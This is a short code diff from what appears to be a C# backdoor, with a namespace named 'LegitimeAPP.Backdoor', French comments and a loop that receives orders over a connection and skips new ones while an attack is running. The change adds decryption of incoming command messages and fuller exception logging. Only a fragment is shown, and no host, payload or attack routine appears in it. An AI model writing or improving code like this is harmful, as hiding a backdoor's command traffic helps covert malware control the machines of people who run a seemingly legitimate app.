@@ -160,9 +160,9 @@ namespace LegitimeAPP.Backdoor {
 
                 try {
                     if ( IsConnected ) {
-                    // Récupère le nouveau message 
-                    string message = GetIncomingMessage() ;
-                    
+                    // Récupère et déchiffre le nouveau message 
+                    string message = _encryption.Decrypt(GetIncomingMessage()) ;
+
                     /*
                     Dans le cas ou une attaque est en cours ignorer le nouvelle ordre
                     */
@@ -183,7 +183,8 @@ namespace LegitimeAPP.Backdoor {
                      break ;
                 }
                 } catch( Exception ex) {
-                    Console.WriteLine(ex.Message) ; 
+                    Console.WriteLine("[Exception]"+ex.Message) ;
+                    Console.WriteLine("[Trace]"+ex.StackTrace) ; 
                 }
 
 
